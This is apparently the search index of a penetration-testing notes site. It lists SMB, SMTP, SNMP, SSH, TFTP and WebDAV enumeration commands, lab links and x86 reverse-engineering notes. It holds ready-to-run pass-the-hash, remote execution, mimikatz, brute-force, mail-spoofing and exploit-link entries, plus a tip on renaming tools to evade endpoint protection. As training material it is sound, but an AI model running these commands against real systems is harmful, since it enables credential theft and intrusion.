NetBIOS over TCP/IP queries nmblookup - A $ ip nbtscan Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ ip / 24 nbtstat nbtstat $ ip nbtscan - \u2010 r $ ip / 24 nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses. nbtstat -n: displays the names that have been registered locally on the system. nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server. nbtstat -R: purges and reloads the remote cache name table. nbtstat -RR: sends name release packets to WINs and then starts Refresh. nbtstat -s: lists the current NetBIOS sessions and their status, including statistics. nbtstat -S: lists sessions table with the destination IP addresses. SMBMap - enumerate samba share drives across an entire domain Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -d workgroup -H $ip smbmap -u -p -d workgroup -H $ip smbmap -u guest -p -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive smbmap -u -p -H 192 .168.1.23 # similar to crackmapexec --shares smbmap -u guest -p -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -r # list top level dir smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -R # list everything recursively smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -s wwwroot -R -A .* # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -x whoami # no work Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups . xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q Using hash: mbmap.py -u user123 -p aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B -H ( TARGET IP ADDRESS ) smbclient https://www.samba.org/samba/docs/current/man-html/smbclient.1.html Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient // 192 . 168 . 1 . 23 / wwwroot smbclient // 192 . 168 . 1 . 23 / C $ WIN20082017 - U Administrator smbclient // 192 . 168 . 1 . 23 / C $ A433F6C2B0D8BB92D7288ECFFACFC7CD - U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash smbclient - L \\\\ WIN7 \\ IPC$ - I 192 . 168 . 13 . 218 smbclient \\\\ 192 . 168 . 13 . 236 \\ some - share - o user = root , pass = root , workgroup = BOB smbclient - L $ ip - U guest - p 445 smbclient - L $ ip - U $ username - p 445 password : prompt smbclient - L // server / share smbclient - L // server / share password options Null session: smbclient - N - L ( TARGET IP ) - m SMB2 Null session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - m SMB2 User session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - U ( USER ) - m SMB2 Kerberos Auth: smbclient --kerberos //ws01win10.domain.com/C$ Pass the hash: smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\\\\\(TARGET IP ADDRESS)\\\\(TARGET SHARE)\\\\ (NTLM HASH) Upload file: smbclient // 192 . 168 . 31 . 142 / ADMIN $ - U nobody % somepassword - c put 40280.py Pass-the-hash: smbclient - U testuser % nthash --pw-nt-hash -L 192.168.0.1 smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ domain - U testuser % nthash --pw-nt-hash Map drives: smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ - U root % Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient smbclient \\10.11.1.220\\SYSVOL - U = contoso/jane%SuperPassword^ - c prompt OFF;recurse ON;lcd . / ;mget * smb : \\ RECURSE ON smb : \\ PROMPT OFF smb : \\ mget * mask recurse ON prompt OFF cd path\\to\\remote\\dir lcd ~/path/to/download/to/ mget * rpcclient Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient - U - N 192 . 168 . 1 . 102 User session: rpcclient - U htb \\\\ james mantis . htb . local Kerberos Auth rpcclient - k ws01win10 . domain . com Querying: rpcclient $ srvinfo # operating system version rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID ( suffix of SID ) rpcclient $ queryuser 0 x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james rpcclient $ netshareenumall # enumerate all shares and its paths rpcclient $ enumdomusers # enumerate usernames defined on the server rpcclient $ getdompwinfo # smb password policy configured on the server Change password: setuserinfo2 administrator 23 \u2018 password1234 \u2019 Lookup SID: lookupnames administrator rpcdump.py rpcdump . py username : password @IP_Address port / protocol ( i . e . 80 / HTTP ) rpcinfo rpcinfo [ options ] IP_Address Enum4linux Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux - a $ip enum4linux - U $ip - RID cycling ( When RestrictAnonymous is set to 1 on Windows 2000 ) - User listing ( When RestrictAnonymous is set to 0 on Windows 2000 ) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval pth-winexe pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd # using a plaintext password pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # domain user pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash + empty lm hash # or export SMBHASH = aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 pth-winexe -U Administrator% //192.168.1.23 cmd nullinux https://github.com/m8r0wn/nullinux python3 nullinux.py -users -quick DC1.Domain.net python3 nullinux.py -all 192 .168.0.0-5 python3 nullinux.py -shares -U Domain\\User -P Password1 10 .0.0.1,10.0.0.5 acccheck Password attacks acccheck - v - t $ ip - u user - P password_file mblookup NetBIOS over TCP/IP client used to lookup NetBIOS names CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) -u username -H LMHASH:NTHASH crackmapexec smb target ( s ) -u username -H NTHASH crackmapexec -u guest -p --shares 192 .168.1.23 crackmapexec -u guest -p --rid-brute 4000 192 .168.1.23 crackmapexec -u guest -p --users 192 .168.1.23 crackmapexec smb 192 .168.1.0/24 -u Administrator -p P@ssw0rd crackmapexec smb 192 .168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192 .168.1.0/24 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192 .168.1.23 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192 .168.1.23 # reliable pth code execution Smbexec https://github.com/brav0hax/smbexec wmiexec https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py . / wmiexec . py - hashes ntlmhash Administrator @10.10.0.1 SuperScan Hyena Winfingerprint NetBIOS enumerator","title":"Tools"},{"location":"ports-and-protocols/#vulnerabilities","text":"Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit / windows / smb / ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit / windows / smb / ms08_067_netapi","title":"Vulnerabilities"},{"location":"ports-and-protocols/#hardening","text":"","title":"Hardening"},{"location":"ports-and-protocols/#references","text":"NetBios https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2 nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html","title":"References"},{"location":"ports-and-protocols/#smtp-25tcp","text":"Quick Reference Connect: nc - \u2010 nv 192 . 168 . 11 . 215 25 Configuration files sendmail . cf submit . cf User enumeration with: \"VRFY\", \"EXPN\" \"RCPT\" commands: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10 .11.1.22 VRFY username ( verifies if username exists - enumeration of accounts ) EXPN username ( verifies if username is valid - enumeration of accounts ) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $( cat users.txt ) ; do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done Mail Spoofing: http://0daysecurity.com/penetration-testing/enumeration.html HELO anything MAIL FROM : spoofed_address RCPT TO : valid_mail_account DATA . QUIT Mail Relay HELO anything Identical to / from - mail from : nobody @ domain rcpt to : nobody @ domain Unknown domain - mail from : user @ unknown_domain Domain not present - mail from : user @ localhost Domain not supplied - mail from : user Source address omission - mail from : rcpt to : nobody @ recipient_domain Use IP address of target server - mail from : user @ IP_Address rcpt to : nobody @ recipient_domain Use double quotes - mail from : user @ domain rcpt to : user@recipent-domain User IP address of the target server - mail from : user @ domain rcpt to : nobody @ recipient_domain @[ IP Address ] Disparate formatting - mail from : user @[ IP Address ] rcpt to : @ domain : nobody @ recipient - domain Disparate formatting2 - mail from : user @[ IP Address ] rcpt to : recipient_domain ! nobody @[ IP Address ] http://0daysecurity.com/penetration-testing/enumeration.html Sending a mail HELO my . server . com MAIL FROM : RCPT TO : DATA From : Danny Dolittle To : Sarah Smith Subject : Email sample Mime - Version : 1 . 0 Content - Type : text / plain ; charset=us-ascii This is a test email for you to read . . QUIT Brute-forcing: hydra ( TARGET IP ADDRESS ) smtp - l ( USERNAME ) - P / path / to / wordlist . txt - V - s ( TARGET PORT ) Other commands Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify Tools smtp_enum: auxiliary / scanner / smtp / smtp_enum smtp-enum-users.nse: nmap \u2013 script smtp - enum - users . nse 172 . 16 . 212 . 133 Hardening References","title":"SMTP - 25/tcp"},{"location":"ports-and-protocols/#snmp-161udp","text":"Quick Reference Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered. Configuration Files snmp . conf snmpd . conf snmp - config . xml SNMP - Management Information Base (MBI) Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ... Scanning nmap - sU - p 161 --open ip nmap - sU - p 161 --script=*snmp* 192.168.1.200 xprobe2 - v - p udp : 161 : open 192 . 168 . 1 . 200 auxiliary / scanner / snmp / snmp_login auxiliary / scanner / snmp / snmp_enum Default community strings public private cisco cable - docsis ILMI Important Properties: Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames .1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information Commands: snmp - check 192 . 168 . 1 . 2 - c public snmpget - v 1 - c public IP snmpbulkwalk - v2c - c public - Cn0 - Cr10 IP Tools SNMPWalk sudo apt install --no-upgrade snmp-mibs-downloader snmpwalk - Os - c public - v 1 ip snmpwalk - c public ( TARGET IP ADDRESS ) - v1 - On snmpwalk - c public - v2c ( TARGET IP ADDRESS ) v3 doesnt have easily guessable / default community string Probe MBI snmpwalk - c public - v 1 ip 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 1 . 6 . 0 System Processes \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 Running Programs \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 4 Processes Path \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 2 . 3 . 1 . 4 Storage Units \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 6 . 3 . 1 . 2 Software Name \u2022 1 . 3 . 6 . 1 . 4 . 1 . 77 . 1 . 2 . 25 User Accounts \u2022 1 . 3 . 6 . 1 . 2 . 1 . 6 . 13 . 1 . 3 TCP Local Ports onesixtyone Scan one community string for multiple IPs onesixtyone - c community . txt - i ips . txt onesixtyone - c / pwnt / passwords / wordlists / SecLists / Discovery / SNMP / snmp . txt ( TARGET IP ADDRESS ) snmpenum: perl snmpenum . pl 192 . 168 . 38 . 200 public windows . txt OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck Hardening References","title":"SNMP - 161/udp"},{"location":"ports-and-protocols/#squidproxy-3128tcp","text":"Quick Reference Usable in pivoting: auxiliary / scanner / http / squid_pivot_scanning nikto - h http : // ( TARGET IP ADDRESS ) - useproxy http : // ( TARGET IP ADDRESS ): 3128 Tools Hardening References","title":"SquidProxy - 3128/tcp"},{"location":"ports-and-protocols/#ssh-22tcp","text":"Quick Reference User Enumeration: searchsploit - m 40136 auxiliary / scanner / ssh / ssh_enumusers Configuration Files ssh_config sshd_config authorized_keys ssh_known_hosts . shosts PPK (Putty) to SSH/RSA key-file puttygen my_private_key . ppk - O private - openssh - o keyfile chmood 600 keyfile ssh - l ( USERNAME ) ( TARGET IP ADDRESS ) - i keyfile RSA key cracking ssh2john id_rsa id_rsa . john john --wordlist=/path/to/rockyou.txt id_rsa.john Tools scanssh scanssh - p - r - e excludes random ( no . ) / Network_ID / Subnet_Mask HASSH - a Profiling Method for SSH Clients and Servers: https://github.com/salesforce/hassh/ \"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. Hardening SSH Auditor: https://github.com/ncsa/ssh-auditor Re-check all known hosts as new credentials are added. It will only check the new credentials. Queue a full credential scan on any new host discovered. Queue a full credential scan on any known host whose ssh version or key fingerprint changes. Attempt command execution as well as attempt to tunnel a TCP connection. Re-check each credential using a per credential scan_interval - default 14 days. References","title":"SSH - 22/tcp"},{"location":"ports-and-protocols/#telnet-23tcp","text":"Quick Reference Configuration files / etc / inetd . conf / etc / xinetd . d / telnet / etc / xinetd . d / stelnet Tools Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/ Hardening References","title":"Telnet - 23/tcp"},{"location":"ports-and-protocols/#tftp-69tcp","text":"Quick Reference Enumeration tftp ip_address PUT local_file tftp ip_address GET conf.txt ( or other files ) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd ( old Solaris ) Connect TFTP tftp connect ( to ) ip tftp verbose Transfer file tftp binary tftp put example . exe / windows / system32 / example . exe Receive file tftp binary tftp get / windows / system32 / example . exe Tools Hardening References","title":"TFTP - 69/tcp"},{"location":"ports-and-protocols/#vnc-5900tcp","text":"Quick Reference Configuration files .vnc / etc / vnc / config $HOME / .vnc / config / etc / sysconfig / vncservers / etc / vnc.conf Registry locations \\ HKEY_CURRENT_USER \\ Software \\ ORL \\ WinVNC3 \\ HKEY_USERS \\ . DEFAULT \\ Software \\ ORL \\ WinVNC3 reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKCU \\ Software \\ TightVNC \\ Server reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Description key: 0 x238210763578887 Connect over SSH tunnel ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127 .0.0.1::5901 vncviewer 127 .0.0.1::5901\u200b -passwd\u200b secret Tools Hardening References","title":"VNC - 5900/tcp"},{"location":"ports-and-protocols/#webdev","text":"Quick Reference Check Capabilities: davtest - url http : // grandpa . htb / Interact Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http : // 10 . 10 . 10 . 15 Upload file: curl --upload-file ./example.php --user user:password http:// ip /webdav_url Exploits: IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl - https://github.com/edwardz246003/IIS_exploit - https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html - https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0 Tools Hardening References","title":"WebDev"},{"location":"ports-and-protocols/#x11-6000tcp","text":"Quick Reference Configuration files /etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on Tools Hardening References","title":"X11 - 6000/tcp"},{"location":"practice/","text":"Practice Environments Free https://overthewire.org/wargames/ https://ics-cert-training.inl.gov/learn https://fedvte.usalearning.gov/public_fedvte.php https://github.com/bugcrowd/bugcrowd_university https://www.splunk.com/en_us/training/free-courses/splunk-fundamentals-1.html https://live.splunk.com/splunk-security-dataset-project https://www.dfir.training/tools-sw-hw https://www.springboard.com/resources/learning-paths/cybersecurity-foundations/ https://www.cyberaces.org/courses.html Partially Free Paid https://cyberwarfare.live/ YouTube Building an infosec IT Home Lab: https://www.youtube.com/watch?v=yDWug2zhjyA list=PLyJqGMYm0vnP9sgEGRxmhUKFQVVz68Cbh Home Lab Cyber Range series: https://www.youtube.com/watch?v=F1GnwLplxHA list=PLyJqGMYm0vnOdiXf0XfpjtPTiTWLD4Zso IppSec: https://www.youtube.com/c/ippsec/playlists OSCP: https://www.youtube.com/watch?v=2DqdPcbYcy8 list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf OSWE: https://www.youtube.com/watch?v=NMGsnPSm8iw list=PLidcsTyj9JXKTnpphkJ310PVVGF-GuZA0 Practice Free https://pentesterlab.com/exercises https://hack.me/ Partially Free https://www.hackthebox.eu/ https://cyberdefenders.org/ https://www.hackthissite.org/ https://tryhackme.com/ Paid Cloud CloudGoat: https://github.com/RhinoSecurityLabs/cloudgoat https://github.com/appsecco/attacking-cloudgoat2 https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/ https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/ https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ https://medium.com/@rzepsky https://medium.com/@rzepsky/playing-with-cloudgoat-part-1-hacking-aws-ec2-service-for-privilege-escalation-4c42cc83f9da https://medium.com/@rzepsky/playing-with-cloudgoat-part-2-fooling-cloudtrail-and-getting-persistence-access-6a1257bb3f7c https://medium.com/@rzepsky/playing-with-cloudgoat-part-3-using-aws-lambda-for-privilege-escalation-and-exploring-a-lightsail-4a48688335fa https://medium.com/@rzepsky/playing-with-cloudgoat-part-4-security-nuances-of-aws-glue-codebuild-and-s3-services-cc67fb88cc46 https://medium.com/@rzepsky/playing-with-cloudgoat-part-5-hacking-aws-with-pacu-6abe1cf5780d https://medium.com/securing/data-leaks-from-aws-ec2-how-can-bob-reveal-alices-secrets-bd6fbe389966","title":"Practice Environments"},{"location":"practice/#practice-environments","text":"Free https://overthewire.org/wargames/ https://ics-cert-training.inl.gov/learn https://fedvte.usalearning.gov/public_fedvte.php https://github.com/bugcrowd/bugcrowd_university https://www.splunk.com/en_us/training/free-courses/splunk-fundamentals-1.html https://live.splunk.com/splunk-security-dataset-project https://www.dfir.training/tools-sw-hw https://www.springboard.com/resources/learning-paths/cybersecurity-foundations/ https://www.cyberaces.org/courses.html Partially Free Paid https://cyberwarfare.live/ YouTube Building an infosec IT Home Lab: https://www.youtube.com/watch?v=yDWug2zhjyA list=PLyJqGMYm0vnP9sgEGRxmhUKFQVVz68Cbh Home Lab Cyber Range series: https://www.youtube.com/watch?v=F1GnwLplxHA list=PLyJqGMYm0vnOdiXf0XfpjtPTiTWLD4Zso IppSec: https://www.youtube.com/c/ippsec/playlists OSCP: https://www.youtube.com/watch?v=2DqdPcbYcy8 list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf OSWE: https://www.youtube.com/watch?v=NMGsnPSm8iw list=PLidcsTyj9JXKTnpphkJ310PVVGF-GuZA0","title":"Practice Environments"},{"location":"practice/#practice","text":"Free https://pentesterlab.com/exercises https://hack.me/ Partially Free https://www.hackthebox.eu/ https://cyberdefenders.org/ https://www.hackthissite.org/ https://tryhackme.com/ Paid Cloud CloudGoat: https://github.com/RhinoSecurityLabs/cloudgoat https://github.com/appsecco/attacking-cloudgoat2 https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/ https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/ https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ https://medium.com/@rzepsky https://medium.com/@rzepsky/playing-with-cloudgoat-part-1-hacking-aws-ec2-service-for-privilege-escalation-4c42cc83f9da https://medium.com/@rzepsky/playing-with-cloudgoat-part-2-fooling-cloudtrail-and-getting-persistence-access-6a1257bb3f7c https://medium.com/@rzepsky/playing-with-cloudgoat-part-3-using-aws-lambda-for-privilege-escalation-and-exploring-a-lightsail-4a48688335fa https://medium.com/@rzepsky/playing-with-cloudgoat-part-4-security-nuances-of-aws-glue-codebuild-and-s3-services-cc67fb88cc46 https://medium.com/@rzepsky/playing-with-cloudgoat-part-5-hacking-aws-with-pacu-6abe1cf5780d https://medium.com/securing/data-leaks-from-aws-ec2-how-can-bob-reveal-alices-secrets-bd6fbe389966","title":"Practice"},{"location":"red-blue-team/","text":"NIST 800-53r4 CA-7 (1-3) CA-8 (2) Silent Trinity / gcap Red Team Do not use standard signatures (file names) Change name of the tools (mimidogz) caused endpoint protection tools to fail BadBlood Responder Poisoning tool for Windows Default Protocols Detectable using Respounder / Responder Guard CrackMapExec CrackMap uses DCSync Detecting PTH attacks: DomainPasswordSpray Mimikatz BloodHound / PlumHound Blue team Exchange and outlook do not log. IIS log only to disk, not to event log. Managed Service Providers (MSP) should see AV kills. MSSP should catch Mimikatz. BloodHound - PlumHound Setup Run https://github.com/davidprowe/BadBlood Run https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-DomainBuildScripts https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-Sysmon/sysmon-modular-master Import - Module Merge - SysmonXML . ps1 Merge - AllSysmonXml - Path ( Get - ChildItem [0-9]*\\*.xml ) - AsString | Out - File sysmonconfig . xml Endpoint-protection vs aEDR Tooling Collaboration https://vectr.io/ https://plextrac.com/","title":"Red blue team"},{"location":"red-blue-team/#red-team","text":"Do not use standard signatures (file names) Change name of the tools (mimidogz) caused endpoint protection tools to fail BadBlood","title":"Red Team"},{"location":"red-blue-team/#responder","text":"Poisoning tool for Windows Default Protocols Detectable using Respounder / Responder Guard","title":"Responder"},{"location":"red-blue-team/#crackmapexec","text":"CrackMap uses DCSync Detecting PTH attacks:","title":"CrackMapExec"},{"location":"red-blue-team/#domainpasswordspray","text":"","title":"DomainPasswordSpray"},{"location":"red-blue-team/#mimikatz","text":"","title":"Mimikatz"},{"location":"red-blue-team/#bloodhound-plumhound","text":"","title":"BloodHound / PlumHound"},{"location":"red-blue-team/#blue-team","text":"Exchange and outlook do not log. IIS log only to disk, not to event log. Managed Service Providers (MSP) should see AV kills. MSSP should catch Mimikatz. BloodHound - PlumHound","title":"Blue team"},{"location":"red-blue-team/#setup","text":"Run https://github.com/davidprowe/BadBlood Run https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-DomainBuildScripts https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-Sysmon/sysmon-modular-master Import - Module Merge - SysmonXML . ps1 Merge - AllSysmonXml - Path ( Get - ChildItem [0-9]*\\*.xml ) - AsString | Out - File sysmonconfig . xml Endpoint-protection vs aEDR","title":"Setup"},{"location":"red-blue-team/#tooling","text":"Collaboration https://vectr.io/ https://plextrac.com/","title":"Tooling"},{"location":"reverse-engineering/","text":"Quick References Introduction to RE Why RE is necessary (no-support/source/malware) IA-32 CPU architecture General Purpose Registers (V1 C3.4.1): EAX - accumulator EBX - pointer to data in DS segment ECX - counter for string and loop operations EDX - I/O pointer ESI Pointer to data in the segment pointed to by the DS register Source pointer for string operations EDI Pointer to data or destination in the segment pointed to by the ES register Destination pointer for string operations ESP - Stack pointer, in the SS segment EBP - Pointer to data on the stack, in the SS segment Accessing parts of registers (EAX AH AL) EFLAGS (V1 C3.4.3) Arithmetic: OF SF ZF AF PF CF ZF SCAS CMPS (CMSB/CMPSW/CMPSD) LOOP (LOOPE/LOOPE/LOOPZ/LOOPNE/LOOPNZ) DF (direction flag) 1: String instructions auto-decrement (processed from higher to lower address) 0: String instructions auto-increment (processed from from lower to higher address) cld to **cl**ear **d**irection flag std to s**e**t **d**irection flag String operation ESI/EDI: must point to either to start/end of the string ECX must contain number of bytes to compare IOPL ( IO **p**rivilege **l**evel) - OS operations Trap Flag - Enable single step mode (debugging) Segment Registers (V1 C3.4.2) CS - code DS - data SS - stack ES - data FS - data GS - data EIP - Instruction Pointer Register = PC (V1 C3.5) Cannot access directly DR0 - DR7: Debug Registers (V3 C317.2) DR0 - DR3 are important: Used to store hardware breakpoints (addresses) Cannot be accessed directly from userland (Ring-3) In Windows use Ring 3 API and transfer execution to kernel level to update the register Machine/Model Specific Registers (V1 C3.2) Not accessible to applications, except from Time-Stamp Counter 64-bit Read using RDTSC (Read time-stamp counter) Low read to EAX High read to EDX Incremented with every clock cycle (reset when processor reset) CPU has a thread-wise context Software breakpoints work by 0xCC (int 3h) instruction. Core modification, is independent from thread context. Functions Why functions are required in a program Execution flow changes and it's required to remember where the execution was left off (and registers) Introduce stack (SS) Stack: https://en.wikibooks.org/wiki/X86_Disassembly/The_Stack Process: Contain threads Created by OS and provided with a virtual address space OS creates at least one thread, ready to be executed Thread: Has it's own stack Share the same virtual address space (of process) Time slice assigned by processor to that specific process Singe processor system: One thread at a time Multi processor system: Simultaneous threads Multi-tasking: Illusion of simultaneous execution of multiple application at the same time Multi-threading: Multiple threads that actually run in parallel PUSH POP - LIFO and bottom to top nature ESP always point to TOS is decremented to point to new place Addition decrement Removal increment Function calling (V1 C6): https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames Parameters pushed to stack CALL Push return address to (return IP) ti stack Load the address of the function's entry-point (to EIP) RET POP address from TOS to EIP and resume execution RET 4. RET + increment ESP 4 bytes (used in stdcall and fastcall ) Stack frames (V1 C6) Each function need a way to store return/local variables etc. Function prologue create a frame for each function After this some GP registers stored in stack Function epilogue re-balance the stack (free memory) after execution Before this GP registers are restored prologue: https://en.wikipedia.org/wiki/Function_prologue push ebp # save base pointer mov ebp, esp # set the base-pointer, so that it points to the top of the stack sub esp, N # allocate memory for current stack frame enter N, 0 # More complex prologues can be obtained using different values (other than 0) function invocation push eax # save registers push ebx # Function body pop ebx # restore saved registers pop eax epilogue: mov esp, ebp # free memory allocated for current stack frame pop ebp # restore previous base pointer ret # exit function leave ret Calling conventions: https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions cdecl Arguments are passed on the stack in Right - to - Left order, and return values are passed in eax . The calling function cleans the stack. CDECL functions to have variable-length argument lists (aka variadic functions) Number of arguments is not appended to the name of the function by the compiler, and the assembler and the linker are therefore unable to determine if an incorrect number of arguments is used. CDECL functions are almost always prepended with an _ . _cdecl int MyFunction1 ( int a , int b ) { return a + b ; } x = MyFunction1 ( 2 , 3 ); _MyFunction1: push ebp # prologue mov ebp, esp # prologue mov eax, [ ebp + 8 ] # read 1st param into eax mov edx, [ ebp + 12 ] # read 2nd param into abx add eax, edx pop ebp # epilogue ret # epilogue push 3 